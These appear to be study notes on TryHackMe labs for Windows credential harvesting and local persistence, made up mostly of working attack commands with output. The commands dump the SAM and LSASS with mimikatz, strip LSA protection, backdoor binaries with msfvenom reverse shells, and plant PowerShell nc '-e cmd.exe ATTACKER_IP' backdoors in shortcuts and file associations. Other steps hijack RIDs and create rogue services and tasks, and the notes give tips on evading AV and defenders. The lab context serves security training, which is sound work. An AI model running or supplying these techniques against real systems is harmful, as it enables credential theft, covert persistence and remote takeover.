1.    Run the standard cmd.exe prompt with administrator privileges.
2.    Execute the wmic command to create a copy shadow of C: drive
3.    Verify the creation from step 2 is available.
4. Copy the SAM database from the volume we created in step 2

Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:
```
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
};
```
Once the command is successfully executed, let's use the vssadmin, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the C: volume. 
```
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```
The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1. 

As mentioned previously, the SAM database is encrypted either with RC4
```
https://en.wikipedia.org/wiki/RC4
```
or AES 
```
https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
```
encryption algorithms. In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system. 

Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows,
```
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

Now we have both required files, transfer them to the AttackBox with your favourite method (SCP should work). 

### Registry Hives

Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Let's this time decrypt it using one of the Impacket tools: secretsdump.py, which is already installed in the AttackBox. The Impacket SecretsDump script extracts credentials from a system locally and remotely using different techniques.

Move both SAM and system files to the AttackBox and run the following command:
```
           
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Note that we used the SAM and System files that we extracted from Windows Registry. The -sam argument is to specify the path for the dumped sam file from the Windows machine. The -system argument is for a path for the system file. We used the LOCAL argument at the end of the command to decrypt the Local SAM file as this tool handles other types of decryption. 

Note if we compare the output against the NTLM hashes we got from Metasploit's Hashdump, the result is different. The reason is the other accounts belong to Active Directory, and their information is not stored in the System file we have dumped. To Decrypt them, we need to dump the SECURITY file from the Windows file, which contains the required files to decrypt Active Directory accounts.

Once we obtain NTLM hashes, we can try to crack them using Hashcat if they are guessable, or we can use different techniques to impersonate users using the hashes.


#### Local Security Authority Subsystem Service LSASS

### What is the LSASS
Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, such as file shares, SharePoint sites, and other network services, without entering credentials every time a user connects.

Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. Luckily for us, if we have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. This attack is defined in the MITRE ATT&CK framework as "OS Credential Dumping: LSASS Memory (T1003)".
```
https://attack.mitre.org/techniques/T1003/001/
```

### Graphic User Interface GUI
To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required process, right-click on it, and select "Create dump file".
![image](https://user-images.githubusercontent.com/24814781/189446114-cf5d88ac-43f5-49dc-b6d9-46b970d08aa0.png)

Once the dumping process is finished, a pop-up message will show containing the path of the dumped file. Now copy the file and transfer it to the AttackBox to extract NTLM hashes offline. 

### Sysinternals Suite
An alternative way to dump a process if a GUI is not available to us is by using ProcDump. ProcDump is a Sysinternals process dump utility that runs from the command prompt. The SysInternals Suite is already installed in the provided machine at the following path: c:\Tools\SysinternalsSuite obs: in this demo/example

We can specify a running process, which in our case is lsass.exe, to be dumped as follows,
```
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[09:09:33] Dump 1 initiated: c:\Tools\Mimikatz\lsass_dump-1.dmp
[09:09:33] Dump 1 writing: Estimated dump file size is 162 MB.
[09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds
```
Note that the dump process is writing to disk. Dumping the LSASS process is a known technique used by adversaries. Thus, AV products may flag it as malicious. In the real world, you may be more creative and write code to encrypt or implement a method to bypass AV products.

### local MimiKatz2

Mimikatz 
```
https://github.com/gentilkiwi/mimikatz
```
is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information. Thus, it requires administrator and system privileges in order to dump memory and extract credentials.

We will be using the Mimikatz tool to extract the memory dump of the lsass.exe process. 

Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,
```
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # 
```

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. It can be done by executing privilege::debug command as follows,
```
mimikatz # privilege::debug
Privilege '20' OK
```

Once the privileges are given, we can access the memory to dump all cached passwords and hashes from the lsass.exe process using sekurlsa::logonpasswords. If we try this on the provided VM, it will not work until we fix it in the next section.

```
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/3/2022 8:30:44 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...
```

Mimikatz lists a lot of information about accounts and machines. If we check closely in the Primary section for Administrator users, we can see that we have an NTLM hash. 

Note to get users' hashes, a user (victim) must have logged in to a system, and the user's credentials have been cached.

### Protected LSASS

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.

The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```
The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

Note: If this fails with an isFileExist error, exit mimikatz, navigate to the mimikatz folder/path and run the command again.

Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:
```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.


### Windows Credential Manager

This task introduces the Windows Credential Manager and discusses the technique used for dumping system credentials by exploiting it.

### What is Credentials Manager

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:

*    Web credentials contain authentication details stored in Internet browsers or other applications.
*    Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
*    Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
*    Certificate-based credentials: Athunticated details based on certifications.

Note that authentication details are stored on the user's folder and are not shared among Windows user accounts. However, they are cached in memory.


### Accessing Credential Manager

We can access the Windows Credential Manager through GUI (Control Panel -> User Accounts -> Credential Manager) or the command prompt. In this task, the focus will be more on the command prompt scenario where the GUI is not available.

![image](https://user-images.githubusercontent.com/24814781/189448879-86098697-e5fb-4535-b84a-accd23c2c353.png)

We will be using the Microsoft Credentials Manager vaultcmd utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target. 

```
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```
By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.

Let's check if there are any stored credentials in the Web Credentials vault by running the vaultcmd command with /listproperties.

```
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```
The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,

```
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```

### Credential Dumping

The VaultCmd is not able to show the password, but we can rely on other PowerShell Scripts such as Get-WebCredentials.ps1,
```
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
```

Ensure to execute PowerShell with bypass policy to import it as a module as follows,
```
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

The output shows that we obtained the username and password for accessing the internal application.


### RunAs

An alternative method of taking advantage of stored credentials is by using RunAs. RunAs is a command-line built-in tool that allows running Windows applications or tools under different users' permissions. The RunAs tool has various command arguments that could be used in the Windows system. The /savecred argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.

Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using cmdkey, which is a tool to create, delete, and display stored Windows credentials. By providing the /list argument, we can show all stored credentials, or we can specify the credential to display more details /list:computername.

```
C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```

The output shows that we have a domain password stored as the thm\thm-local user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the thm-local user.

```
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```


A new cmd.exe pops up with a command prompt ready to use. Now run the whoami command to confirm that we are running under the desired user. There is a flag in the c:\Users\thm-local\Saved Games\flag.txt, try to read it and answer the question below.

### local Mimikatz2
Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.
```
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```





------------------------------------------------------------------------------------------------------------------
## Windows Local Persistence tryhackme
```
https://tryhackme.com/room/windowslocalpersistence
```
# Local Persistence
![image](https://user-images.githubusercontent.com/24814781/188224196-0cccf974-9cb2-4873-9047-a67c30199f92.png)

### persistence Introduction

After gaining the first foothold on your target's internal network, you'll want to ensure you don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.

There are many reasons why you'd want to establish persistence as quick as possible, including:

*   Re-exploitation isn't always possible: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
*   Gaining a foothold is hard to reproduce: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
*   The blue team is after you: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!


While you could do with keeping some administrator's password hash and reusing it to connect back, you always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which you could regain access to a compromised machine, making life harder for the blue team.



### Tampering With Unprivileged Accounts
Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

#### Assign Group Memberships

For this part of the task, we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. We can easily achieve this with the following command:
```
C:\> net localgroup administrators <user> /add
```

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the Backup Operators group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group:
```
C:\> net localgroup "Backup Operators" <user> /add
```
Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. We'll use WinRM for this task:
```
C:\> net localgroup "Remote Management Users" <user> /add
```

If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:

![image](https://user-images.githubusercontent.com/24814781/188226047-0b307a8c-7cef-4259-b97d-552da1c0449f.png)

This is due to User Account Control (UAC). One of the features implemented by UAC, LocalAccountTokenFilterPolicy, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session, if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
![image](https://user-images.githubusercontent.com/24814781/188227068-9ec17624-cd93-4105-890f-c3b3d4f820f0.png)


Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:

![image](https://user-images.githubusercontent.com/24814781/188226312-1f9a60b0-9f89-427c-955c-ed9f5036519c.png)

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

![image](https://user-images.githubusercontent.com/24814781/188226396-3c868f78-686a-4a8e-a4dc-119a7825148f.png)

Note: If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:
![image](https://user-images.githubusercontent.com/24814781/188230598-22db53df-6636-44fd-a941-c586fe364a2c.png)


And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
![image](https://user-images.githubusercontent.com/24814781/188230617-f85af7c5-5c22-419f-87e1-d11c9c7aeba2.png)


### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found here for reference.
```
https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants
```


In the case of the Backup Operators group, it has the following two privileges assigned by default:

*    SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
*    SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the secedit command. First, we will export the current configuration to a temporary file:
```
secedit /export /cfg config.inf
```
  
We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:
![image](https://user-images.githubusercontent.com/24814781/188231328-dd0beeec-4d81-4612-9733-67cf0507c35c.png)

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):
```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![image](https://user-images.githubusercontent.com/24814781/188231648-585b8f74-3988-46c7-bb35-5b7dba21020b.png)


Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the LocalAccountTokenFilterPolicy registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
![image](https://user-images.githubusercontent.com/24814781/188231749-642d6f84-c4a9-4509-a46a-841c0f00c526.png)

### RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.

To find the assigned RIDs for any user, you can use the following command:
![image](https://user-images.githubusercontent.com/24814781/188232054-70f4d190-caa2-4904-9700-ead384b8c36e.png)

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in C:\tools\pstools in your machine:
![image](https://user-images.githubusercontent.com/24814781/188232307-9c384af2-3d0e-4354-83e6-e768d09a0c6e.png)


From Regedit, we will go to HKLM\SAM\SAM\Domains\Account\Users\ where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID at position 0x30:
![image](https://user-images.githubusercontent.com/24814781/188232350-9e9fa8e5-1109-4193-9e32-7321b5ad643e.png)

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![image](https://user-images.githubusercontent.com/24814781/188232623-74b4e08a-b363-42fb-9a14-158b82e04d04.png)

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

### Backdooring Files

Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

### Executable Files

If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to C:\Program Files\PuTTY\putty.exe. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

You can easily plant a payload of your preference in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:
```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

Shortcut Files

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to calc on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:
![image](https://user-images.githubusercontent.com/24814781/188234525-af4c5c96-a572-4404-916f-50c1b442f125.png)

Before hijacking the shortcut's target, let's create a simple Powershell script in C:\Windows\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the -windowstyle hidden option to Powershell. The final target of the shortcut would be:
```
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

Let's start an nc listener to receive our reverse shell on our attacker's machine:
![image](https://user-images.githubusercontent.com/24814781/188234860-f0557d8a-4709-4441-874f-eb8c5f767683.png)

### Hijacking File Associations
In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under HKLM\Software\Classes\. Let's say we want to check which program is used to open .txt files; we can just go and check for the .txt subkey and find which Programmatic ID (ProgID) is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:
![image](https://user-images.githubusercontent.com/24814781/188235080-d319df33-2401-446c-9b93-495e2c51538d.png)

We can then search for a subkey for the corresponding ProgID (also under HKLM\Software\Classes\), in this case, txtfile, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified:

![image](https://user-images.githubusercontent.com/24814781/188235114-9c549c17-c0da-4e57-a0bc-6f54fff52cce.png)

In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1:

```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass $args[0] to notepad, as it will contain the name of the file to be opened, as given through %1.

Now let's change the registry key to run our backdoor script in a hidden window:

![image](https://user-images.githubusercontent.com/24814781/188235177-98d11784-7589-4f5c-9f2d-03effc7b6ce8.png)

Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.

### Abusing Services 
Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

### Creating backdoor services

We can create and start a service named "THMservice" using the following commands:
example:
```
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```
Note: There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom:
![image](https://user-images.githubusercontent.com/24814781/188330996-77f5f21a-9595-4ffb-b092-44a64483570c.png)

You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:
```
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

### Modifying existing services

While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

You can get a list of available services using the following command:
```
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

You should be able to find a stopped service called THMService3 (as in this example). To query the service's configuration, you can use the following command:
```
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

There are three things we care about when using a service for persistence:

*    The executable (BINARY_PATH_NAME) should point to our payload.
*    The service START_TYPE should be automatic so that the payload runs without user interaction.
*    The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.

Let's start by creating a new reverse shell with msfvenom:
![image](https://user-images.githubusercontent.com/24814781/188331270-9f487f2e-e8a9-49fc-b7d5-8631b494e6b3.png)

To reconfigure "THMservice3" parameters, we can use the following command:
![image](https://user-images.githubusercontent.com/24814781/188331365-61d5ed34-3804-4a1e-8321-181b0ba4918a.png)

### Abusing Scheduled Tasks
We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:

### Task Scheduler

The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use schtasks to interact with the task scheduler. A complete reference for the command can be found on Microsoft's website.
```
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
```

Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
![image](https://user-images.githubusercontent.com/24814781/188331518-fae78dd5-2783-484b-b881-70dc71f07538.png)

Note: Be sure to use THM-TaskBackdoor as the name of your task, or you won't get the flag.

